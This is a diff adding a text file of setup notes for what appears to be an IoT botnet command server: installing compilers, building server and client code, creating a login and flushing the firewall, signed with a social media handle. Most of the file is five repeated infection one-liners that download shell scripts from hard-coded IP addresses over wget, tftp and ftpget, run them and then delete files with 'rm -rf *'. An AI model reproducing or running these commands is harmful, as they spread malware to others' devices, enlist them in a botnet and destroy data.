@@ -1,0 +1,62 @@
+
+yum install epel-release -y
+
+yum install groupinstall "Development Tools" -y
+
+yum install gmp-devel -y
+ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
+yum install screen wget bzip2 gcc gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
+
+
+
+//Steps//									 
+1st Step: Edit the 0.0.0.0 inside the client.c file make sure to replace all.							 
+
+2nd Step: 
+Dependencies First
+and make sure we 
+got everything 
+updated.			   
+[root@Hostname ~]# yum install python-paramiko nano screen gcc perl wget lbzip unzip -y
+
+3rd Step: We have to compile the server side.
+[root@Hostname ~]# gcc server.c -o server -pthread
+
+4th Step: Compile the client side.
+[root@Hostname ~]# python cc7.py client.c [SERVER IP]
+
+5th Step: Now We Have To Screen The Server.
+[root@Hostname ~]# screen ./server 23 1 [PORT OF CHOOSING] Hint: i used 1337
+NOW PRESS CRTL - A+D
+
+6th Step: Create A Login.
+[root@Hostname ~]# echo root root1337 >>login.txt
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://199.38.245.222/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 199.38.245.222 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 199.38.245.222; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+7th Step: Last Thing To Make Sure Its Running.
+
+[root@Hostname ~]# iptables -F
+
+Now goto putty and login with the Your ip and port and make sure its set up on raw instead ssh.
+
+9th Step: YOUR WELCOME YA NOOB :)
+Follow Me ON IG @873u
+
+
+
+
+
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://199.38.243.9/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 199.38.243.9 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 199.38.243.9; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 199.38.243.9 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+
+
+
+
+
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://199.38.245.222/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 199.38.245.222 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 199.38.245.222; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://199.38.245.222/pussy.sh; chmod 777 pussy.sh; sh pussy.sh; tftp 199.38.245.222 -c get dick1.sh; chmod 777 dick1.sh; sh dick1.sh; tftp -r dick2.sh -g 199.38.245.222; chmod 777 dick2.sh; sh dick2.sh; ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf pussy.sh dick1.sh dick2.sh ftp1.sh; rm -rf *
+
+
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://199.38.243.9/pussy.sh; chmod 777 pussy.sh; sh pussy.sh; tftp 199.38.243.9 -c get dick1.sh; chmod 777 dick1.sh; sh dick1.sh; tftp -r dick2.sh -g 199.38.243.9; chmod 777 dick2.sh; sh dick2.sh; ftpget -v -u anonymous -p anonymous -P 21 199.38.243.9 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf pussy.sh dick1.sh dick2.sh ftp1.sh; rm -rf *
